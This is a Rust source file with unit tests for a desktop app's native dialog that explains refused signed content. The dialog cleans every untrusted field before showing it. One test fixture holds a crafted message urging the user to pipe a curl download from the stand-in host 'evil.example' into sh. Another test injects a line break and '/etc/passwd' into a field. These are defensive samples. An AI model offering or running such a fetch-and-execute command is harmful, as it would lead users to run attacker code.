//! Why signed content was refused, shown in a native window (#634, docs/security-boundaries/signed-content.md
//! "Signed content").
//!
//! When the shell refuses this window's content, the person used to see one line in the build bar,
//! drawn by the web UI. That UI is fed by the host, and the host is the very thing whose content failed
//! to verify, so it could hide or rewrite the line. A dialog drawn here, in the window process (the
//! signed app bundle), cannot be suppressed by the host: it needs nothing from the host, only what the
//! shell wrote to `<data>/shell-status.json`, read by the window itself. The keeper's refusal of a
//! switch's content was shown here too, until no window asked for a switch (#1895 step 4, PR 3).
//!
//! **Show, do not run.** This only tells. Nothing here starts, trusts or unlocks the content it names;
//! what keeps running is what the window starts itself (docs/plans/thin-shell.md §6).
//!
//! **The dialog is the window's own voice, so it repeats no one else's words.** Another process of the
//! user can write `shell-status.json`. So the text is built from what the window can vouch for: the
//! *kind* of check (a fixed list of ids, each with fixed words), the file's name (it comes from the
//! signed manifest, and is cut to plain text), two hashes (only if they are 64 hex characters), and the
//! window's own version. The free sentence the shell gave goes to the log only, which "Show log" opens.
//! A refusal is shown once, and one dialog at a time.
//!
//! The wording and the rules are plain functions, so they are tested on every platform; only `show`
//! touches the dialog plugin. The source of a refusal is macOS, but none of this is `cfg(unix)`: a
//! refusal that cannot arise on another OS is simply never offered.

use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

/// What the window knows of one refusal. Only the fields the dialog may say are used by `dialog`;
/// `message` is for the log.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refusal {
    /// The id of the refusal (`content`, `downgrade`, `shell-too-old`).
    pub reason: String,
    /// Which check of the verifier refused (`unknown-key`, `bad-signature`, `hash-mismatch`, …), when known.
    pub check: Option<String>,
    /// The listed file it is about, when it is about one.
    pub file: Option<String>,
    /// For a hash mismatch: the hash the signed manifest lists and the file's.
    pub hashes: Option<(String, String)>,
    /// The free sentence the shell gave. **Log only**: never in the dialog.
    pub message: String,
    /// The version that could not be verified: this window's own.
    pub new_version: Option<String>,
}

/// Which reasons are about the content failing verification, and so are shown here. A copy that failed,
/// a folder in use, or a shell that would not open are not: the build bar already says those, and
/// none says the content is not what was signed.
pub fn is_verification(reason: &str) -> bool {
    matches!(reason, "content" | "downgrade" | "shell-too-old")
}

/// The check ids the dialog has words for (`check_id` in the keeper crate). Any other is not repeated.
pub const KNOWN_CHECKS: [&str; 20] = [
    "missing-file",
    "bad-file",
    "manifest-malformed",
    "signature-malformed",
    "unsupported-format",
    "unknown-key",
    "bad-signature",
    "wrong-platform",
    "shell-too-old",
    "bad-path",
    "duplicate-path",
    "symlink",
    "not-regular-file",
    "size-mismatch",
    "hash-mismatch",
    "copy-mismatch",
    "destination-exists",
    "bad-version",
    "downgrade",
    "file-unreadable",
];

fn known_check(c: &str) -> Option<&str> {
    KNOWN_CHECKS.iter().copied().find(|k| *k == c)
}

/// A version as the dialog may say it: letters, digits and `.+-`, at most 64 characters.
pub fn plain_version(v: &str) -> Option<String> {
    (!v.is_empty() && v.chars().count() <= 64 && v.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-'))).then(|| v.to_string())
}

/// A hash as the dialog may say it: 64 lowercase hex characters.
pub fn plain_hash(h: &str) -> Option<&str> {
    (h.len() == 64 && h.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))).then_some(h)
}

impl Refusal {
    /// The shell's refusal of the window's own content at a start (`shell-status.json`: `reason`), if it is a verification
    /// failure. `found` is what the window found by reading the content itself (`keeper::content::diagnose`); without it
    /// the dialog has only the reason (the shell's sentence, which the same user could have rewritten, goes to the log).
    pub fn from_shell(reason: &str, message: &str, found: Option<Found>, own_version: &str) -> Option<Refusal> {
        if !is_verification(reason) {
            return None;
        }
        let (check, file, hashes, message) = match found {
            Some(f) => (Some(f.check), f.file, f.hashes, f.message),
            // The shell's status of this version carries no check: the reason is the check for the two that are one
            None => (matches!(reason, "downgrade" | "shell-too-old").then(|| reason.to_string()), None, None, message.to_string()),
        };
        Some(Refusal { reason: reason.to_string(), check, file, hashes, message, new_version: plain_version(own_version) })
    }
}

/// What the window found by reading its own content again (`keeper::content::diagnose`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Found {
    pub check: String,
    pub file: Option<String>,
    pub hashes: Option<(String, String)>,
    pub message: String,
}

/// The words for one check, the first line of the details.
fn headline(r: &Refusal) -> &'static str {
    match r.check.as_deref().and_then(known_check) {
        Some("unknown-key") => "It is signed with a key this Centralu does not trust.",
        Some("bad-signature") => "Its signature does not match its manifest.",
        Some("hash-mismatch") => "A file is not the one the signed manifest lists: its hash differs.",
        Some("size-mismatch") => "A file is not the size the signed manifest lists.",
        Some("wrong-platform") => "It is built for another platform.",
        Some("shell-too-old") => "It needs a newer agent shell than the installed one.",
        Some("downgrade") => "It is older than a version that has already run here.",
        Some("missing-file" | "bad-file" | "manifest-malformed" | "signature-malformed" | "unsupported-format") => {
            "Its signed manifest or signature file is missing, damaged or of a format this Centralu does not read."
        }
        Some("file-unreadable") => "A file the signed manifest lists is missing or cannot be read.",
        Some("bad-path" | "duplicate-path" | "symlink" | "not-regular-file") => "The signed manifest lists a file in a way Centralu refuses.",
        _ => match r.reason.as_str() {
            "downgrade" => "It is older than a version that has already run here.",
            "shell-too-old" => "It needs a newer agent shell than the installed one.",
            _ => "It is not what the project signed.",
        },
    }
}

/// What the dialog says, and how its two buttons read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Dialog {
    pub title: String,
    pub text: String,
    /// The button that shows the log.
    pub log_button: String,
    pub close_button: String,
}

pub const TITLE_START: &str = "Centralu could not verify its content";
pub const LOG_BUTTON: &str = "Show log";
pub const CLOSE_BUTTON: &str = "Close";

/// A name from another process as shown: control characters (a line break included) become spaces, runs of spaces one, and
/// no more than `SHOWN_MAX` characters.
pub const SHOWN_MAX: usize = 200;

pub fn plain(s: &str) -> String {
    let mut out = String::new();
    let mut gap = false;
    for c in s.chars() {
        if c.is_control() || c == ' ' {
            gap = !out.is_empty();
            continue;
        }
        if gap {
            out.push(' ');
            gap = false;
        }
        out.push(c);
        if out.chars().count() >= SHOWN_MAX {
            out.push('…');
            break;
        }
    }
    out
}

/// The dialog for a refusal, built only from what the window can vouch for (module docs): the first paragraph says what
/// happened and what keeps running, and Details name the check, the file and the two hashes. The full sentence is in the log.
pub fn dialog(r: &Refusal) -> Dialog {
    let new = r.new_version.as_deref().and_then(plain_version).map(|v| format!("Centralu {v}")).unwrap_or_else(|| "This build".to_string());
    let what = format!(
        "{new} could not be verified by the permission shell, so the shell did not start Centralu. \
         Centralu was started directly from this app instead, and that start was not verified: \
         what agents may access follows this window's permissions, not the shell's."
    );
    let mut details = vec![headline(r).to_string()];
    if let Some(file) = r.file.as_deref().map(plain).filter(|f| !f.is_empty()) {
        details.push(format!("File: {file}"));
    }
    if let Some(check) = r.check.as_deref().and_then(known_check) {
        details.push(format!("Check: {check}"));
    }
    if let Some((expected, found)) = r.hashes.as_ref().and_then(|(a, b)| Some((plain_hash(a)?, plain_hash(b)?))) {
        details.push(format!("The signed manifest lists: {expected}"));
        details.push(format!("The file is: {found}"));
    }
    details.push("The full text is in the log.".to_string());
    let again = match r.new_version.as_deref().and_then(plain_version) {
        Some(v) => format!("npm i -g centralu@{v}` and then `centralu install --force"),
        None => "npm i -g centralu` and then `centralu install --force".to_string(),
    };
    let fetch = format!("To fetch it again, run `{again}` in a terminal, then open Centralu.");
    Dialog {
        title: TITLE_START.to_string(),
        text: format!("{what}\n\n{fetch}\n\nDetails\n{}", details.join("\n")),
        log_button: LOG_BUTTON.to_string(),
        close_button: CLOSE_BUTTON.to_string(),
    }
}

/// Which refusals were already shown in this window's life: one dialog per refusal, not one per start
/// the shell refuses the same way.
#[derive(Debug, Default)]
pub struct Shown {
    keys: HashSet<String>,
    /// When the last dialog was shown, in milliseconds on any clock the caller keeps.
    last_ms: Option<u64>,
    /// A dialog is on screen: set when one is handed out, cleared by its own callback (`show`).
    open: Arc<AtomicBool>,
}

/// The least time between two dialogs, whatever closes them.
pub const MIN_GAP_MS: u64 = 5_000;

impl Shown {
    /// Whether this refusal is new and may be shown now, and notes it. Not while a dialog is open, and not within
    /// `MIN_GAP_MS` of the last one: such a refusal is not noted, so a later call shows it.
    pub fn first(&mut self, r: &Refusal, now_ms: u64) -> bool {
        if self.open.load(Ordering::SeqCst) || self.last_ms.is_some_and(|last| now_ms.saturating_sub(last) < MIN_GAP_MS) {
            return false;
        }
        let key = format!(
            "{}|{}|{}",
            r.new_version.as_deref().unwrap_or(""),
            r.check.as_deref().unwrap_or(&r.reason),
            r.file.as_deref().unwrap_or(""),
        );
        let new = self.keys.insert(key);
        if new {
            self.last_ms = Some(now_ms);
            self.open.store(true, Ordering::SeqCst);
        }
        new
    }

    /// The flag a dialog's callback clears when the person closes it.
    pub fn open_flag(&self) -> Arc<AtomicBool> {
        self.open.clone()
    }
}

/// The rules for what is shown and when (module docs), in one place so they are tested without a window.
#[derive(Debug, Default)]
pub struct Announcer {
    shown: Shown,
    shell: Option<Refusal>,
}

impl Announcer {
    /// The shell refused this window's content at a start.
    pub fn shell_refused(&mut self, r: Option<Refusal>) {
        self.shell = r;
    }

    /// The refusal to show now, if any. Handing one out marks a dialog open until `open_flag` is cleared; one that has to
    /// wait is handed out by a later call.
    pub fn next(&mut self, now_ms: u64) -> Option<Refusal> {
        let r = self.shell.clone()?;
        self.shown.first(&r, now_ms).then(|| {
            self.shell = None;
            r
        })
    }

    pub fn open_flag(&self) -> Arc<AtomicBool> {
        self.shown.open_flag()
    }
}

/// Shows the dialog natively, from this process. Returns at once; "Show log" reveals `log` in the file
/// manager. Never blocks the keeper link's thread: the answer arrives on the dialog's own callback, which
/// clears `open`.
pub fn show(app: &tauri::AppHandle, d: Dialog, log: PathBuf, open: Arc<AtomicBool>) {
    use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
    app.dialog()
        .message(d.text)
        .title(d.title)
        .kind(MessageDialogKind::Warning)
        .buttons(MessageDialogButtons::OkCancelCustom(d.log_button, d.close_button))
        .show(move |show_log| {
            open.store(false, Ordering::SeqCst);
            if show_log {
                if let Err(e) = tauri_plugin_opener::reveal_item_in_dir(&log) {
                    eprintln!("[window] could not show {}: {e}", log.display());
                }
            }
        });
}

#[cfg(test)]
mod tests {
    use super::*;

    fn refusal(check: Option<&str>, file: Option<&str>) -> Refusal {
        Refusal {
            reason: "content".into(),
            check: check.map(String::from),
            file: file.map(String::from),
            hashes: None,
            message: "the content at /App.app/Contents/Resources/content is not what the project signed: \"host/main.mjs\" does not match its hash".into(),
            new_version: Some("9.9.9-test.2".into()),
        }
    }

    const CRAFTED: &str = "Update failed. To repair, open Terminal and run curl -s https:||evil.example|fix | sh then reopen Centralu.app/Contents/Resources/content";

    #[test]
    fn a_start_through_the_shell_says_it_was_started_directly_and_not_verified() {
        let mut r = refusal(Some("hash-mismatch"), Some("host/main.mjs"));
        r.hashes = Some(("a".repeat(64), "b".repeat(64)));
        let d = dialog(&r);
        assert_eq!(d.title, TITLE_START);
        assert!(
            d.text.starts_with("Centralu 9.9.9-test.2 could not be verified by the permission shell, so the shell did not start Centralu. Centralu was started directly from this app instead, and that start was not verified"),
            "{}",
            d.text
        );
        let details = d.text.split("\n\nDetails\n").nth(1).expect("a Details part");
        assert_eq!(
            details.lines().collect::<Vec<_>>(),
            [
                "A file is not the one the signed manifest lists: its hash differs.",
                "File: host/main.mjs",
                "Check: hash-mismatch",
                &format!("The signed manifest lists: {}", "a".repeat(64)),
                &format!("The file is: {}", "b".repeat(64)),
                "The full text is in the log.",
            ]
        );
        assert!(d.text.contains("run `npm i -g centralu@9.9.9-test.2` and then `centralu install --force` in a terminal, then open Centralu."), "{}", d.text);
        assert!(!d.text.contains("centralu update"), "{}", d.text);
        assert_eq!((d.log_button.as_str(), d.close_button.as_str()), ("Show log", "Close"));
        let d = dialog(&refusal(Some("unknown-key"), None));
        assert!(d.text.contains("It is signed with a key this Centralu does not trust.\nCheck: unknown-key\n"), "{}", d.text);
        assert!(!d.text.contains("File:"), "no file when none is named");
    }

    #[test]
    fn the_free_sentence_of_the_shell_is_never_in_the_dialog() {
        // The shell's status can be rewritten by the user's processes: its sentence reaches the log only
        let shell = Refusal::from_shell("downgrade", CRAFTED, None, "9.9.9-test.2").unwrap();
        let d = dialog(&shell);
        assert!(!d.text.contains("curl") && !d.text.contains("Terminal") && !d.text.contains("evil"), "{}", d.text);
        assert!(!d.text.contains("Update failed"), "{}", d.text);
        assert!(shell.message.contains("curl"), "the log has it: {}", shell.message);
    }

    #[test]
    fn only_a_check_id_the_window_knows_and_a_plain_version_or_hash_is_repeated() {
        let mut r = refusal(Some("hash-mismatch\nFile: /etc/passwd"), Some("a\u{7}b\r\nc"));
        r.new_version = Some("0.1\n\nCentralu is fine".into());
        r.hashes = Some(("not a hash".into(), "b".repeat(64)));
        let d = dialog(&r);
        assert!(d.text.starts_with("This build could not be verified by the permission shell"), "{}", d.text);
        assert!(d.text.contains("run `npm i -g centralu` and then `centralu install --force` in a terminal"), "{}", d.text);
        assert!(!d.text.contains("Check:") && !d.text.contains("passwd") && !d.text.contains("Centralu is fine"), "{}", d.text);
        assert!(d.text.contains("File: a b c\n"), "a file name is plain text: {:?}", d.text);
        assert!(!d.text.contains("not a hash") && !d.text.contains("The file is"), "{}", d.text);
        assert!(!d.text.contains('\u{7}') && !d.text.contains('\r'), "{:?}", d.text);
        assert_eq!(plain_version("9.9.9-test.2+7"), Some("9.9.9-test.2+7".into()));
        for bad in ["", "1 2", "1\n2", "a|b", &"1".repeat(65)] {
            assert_eq!(plain_version(bad), None, "{bad:?}");
        }
        assert_eq!(plain_hash(&"0f".repeat(32)), Some("0f".repeat(32).as_str()));
        for bad in ["", "ABCD", &"g".repeat(64), &"a".repeat(63), &"A".repeat(64)] {
            assert_eq!(plain_hash(bad), None, "{bad:?}");
        }
        assert_eq!(plain("  a \n\n b  "), "a b");
        assert!(plain(&"x".repeat(5_000)).chars().count() <= SHOWN_MAX + 1);
        // Every check the verifier can name is known, and its words are its own
        assert_eq!(KNOWN_CHECKS.len(), 20);
    }

    #[test]
    fn every_check_has_its_own_words_and_an_unknown_one_still_says_something() {
        let words = |check: Option<&str>, reason: &str| {
            let mut r = refusal(check, None);
            r.reason = reason.into();
            headline(&r)
        };
        let all = [
            words(Some("unknown-key"), "content"),
            words(Some("bad-signature"), "content"),
            words(Some("hash-mismatch"), "content"),
            words(Some("size-mismatch"), "content"),
            words(Some("wrong-platform"), "content"),
            words(Some("shell-too-old"), "shell-too-old"),
            words(Some("downgrade"), "downgrade"),
            words(Some("missing-file"), "content"),
            words(Some("bad-path"), "content"),
            words(Some("file-unreadable"), "content"),
        ];
        let distinct: HashSet<_> = all.iter().collect();
        assert_eq!(distinct.len(), all.len(), "{all:?}");
        assert_eq!(words(None, "downgrade"), "It is older than a version that has already run here.");
        assert_eq!(words(None, "shell-too-old"), "It needs a newer agent shell than the installed one.");
        assert_eq!(words(None, "content"), "It is not what the project signed.");
        assert_eq!(words(Some("a-check-from-a-newer-shell"), "content"), "It is not what the project signed.");
    }

    #[test]
    fn only_verification_failures_are_shown() {
        for yes in ["content", "downgrade", "shell-too-old"] {
            assert!(is_verification(yes), "{yes}");
        }
        for no in ["copy", "in-use", "no-content", "install", "open", "no-report", "keeper-start", "keeper-exited", "keeper-timeout", "unpinned", "not-carried", "usage", ""] {
            assert!(!is_verification(no), "{no}");
        }
    }

    #[test]
    fn the_shells_refusal_is_worded_from_what_the_window_found_when_it_found_something() {
        let found = Found {
            check: "hash-mismatch".into(),
            file: Some("host/main.mjs".into()),
            hashes: Some(("a".repeat(64), "b".repeat(64))),
            message: "the content at /App.app/Contents/Resources/content is not what the project signed".into(),
        };
        let r = Refusal::from_shell("content", "x", Some(found), "9.9.9-test.2").unwrap();
        assert_eq!((r.check.as_deref(), r.file.as_deref()), (Some("hash-mismatch"), Some("host/main.mjs")));
        assert_eq!(r.hashes, Some(("a".repeat(64), "b".repeat(64))));
        assert_eq!(r.new_version.as_deref(), Some("9.9.9-test.2"));
        let r = Refusal::from_shell("content", "the shell's sentence", None, "9.9.9-test.2").unwrap();
        assert_eq!((r.check, r.file, r.message.as_str()), (None, None, "the shell's sentence"));
        assert_eq!(Refusal::from_shell("downgrade", "x", None, "1").unwrap().check.as_deref(), Some("downgrade"));
        assert_eq!(Refusal::from_shell("shell-too-old", "x", None, "1").unwrap().check.as_deref(), Some("shell-too-old"));
        for reason in ["copy", "install", "open", "no-report", "unpinned", "keeper-timeout"] {
            assert_eq!(Refusal::from_shell(reason, "x", None, "1"), None, "{reason}");
        }
    }

    #[test]
    fn a_refusal_is_shown_once() {
        let mut shown = Shown::default();
        let r = refusal(Some("hash-mismatch"), Some("host/main.mjs"));
        assert!(shown.first(&r, 0));
        shown.open_flag().store(false, Ordering::SeqCst);
        // The shell refuses the same way at the next start
        assert!(!shown.first(&r.clone(), 10 * MIN_GAP_MS));
        // Another file, another build
        assert!(shown.first(&refusal(Some("hash-mismatch"), Some("keeper")), 20 * MIN_GAP_MS));
        shown.open_flag().store(false, Ordering::SeqCst);
        let mut newer = r.clone();
        newer.new_version = Some("9.9.9-test.3".into());
        assert!(shown.first(&newer, 30 * MIN_GAP_MS));
    }

    #[test]
    fn one_dialog_at_a_time_however_long_it_stays_open_and_the_gap_holds_after_it_closes() {
        let mut shown = Shown::default();
        let a = refusal(Some("hash-mismatch"), Some("a"));
        let b = refusal(Some("hash-mismatch"), Some("b"));
        assert!(shown.first(&a, 1_000));
        // Still open an hour later: nothing else is shown, and nothing is noted, so it is shown after it closes
        assert!(!shown.first(&b, 1_000 + 3_600_000));
        shown.open_flag().store(false, Ordering::SeqCst);
        assert!(shown.first(&b, 1_000 + 3_600_000));
        shown.open_flag().store(false, Ordering::SeqCst);
        // Closed at once: the gap still holds
        let c = refusal(Some("hash-mismatch"), Some("c"));
        assert!(!shown.first(&c, 1_000 + 3_600_000 + 1));
        assert!(shown.first(&c, 1_000 + 3_600_000 + MIN_GAP_MS));
    }

    #[test]
    fn the_shells_refusal_is_handed_out_once_and_waits_while_a_dialog_is_open() {
        let shell = Refusal::from_shell("content", "x", None, "9.9.9-test.2").unwrap();
        let mut a = Announcer::default();
        assert_eq!(a.next(0), None);
        a.shell_refused(Some(shell.clone()));
        assert_eq!(a.next(1_000), Some(shell.clone()));
        assert_eq!(a.next(1_000 + MIN_GAP_MS), None);
        a.open_flag().store(false, Ordering::SeqCst);
        let other = Refusal::from_shell("downgrade", "x", None, "9.9.9-test.2").unwrap();
        a.shell_refused(Some(other.clone()));
        assert_eq!(a.next(1_000 + MIN_GAP_MS - 1), None, "within the gap");
        assert_eq!(a.next(1_000 + MIN_GAP_MS), Some(other));
        a.open_flag().store(false, Ordering::SeqCst);
        assert_eq!(a.next(1_000 + 10 * MIN_GAP_MS), None);
    }
}
